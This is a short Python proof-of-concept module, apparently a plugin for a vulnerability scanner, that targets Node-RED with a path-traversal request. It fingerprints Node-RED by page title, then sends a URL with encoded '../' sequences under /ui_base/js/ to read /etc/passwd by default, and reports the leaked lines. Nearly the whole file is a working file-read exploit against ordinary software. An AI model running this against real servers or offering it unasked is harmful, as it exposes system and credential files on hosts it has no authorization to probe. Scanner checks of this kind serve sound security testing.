# -*- coding:utf-8 -*-
# Node-RED 任意文件读取

import traceback
from .. import requestUtil, fileUtil
from ServiceScanModel.models import ServiceScan


def read_file(url, filename="%2fetc%2fpasswd"):
    filename = filename.replace("/", "%2f")
    print(filename)
    resp = requestUtil.get(url + f"/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..{filename}")
    return resp.text


def fingerprint(service):
    try:
        if service.title.lower() == "node-red":
            return True
    except:
        return False


def poc(service: ServiceScan):
    try:
        result = read_file(service.url)
        print(result)
        if "root" in result:
            return ["Node-RED 任意文件读取", "<b>/etc/passwd: </b><br>%s<br>..." % ("<br>".join(result.split("\n")[:2]))]
    except Exception as e:
        traceback.print_exc()
        return []
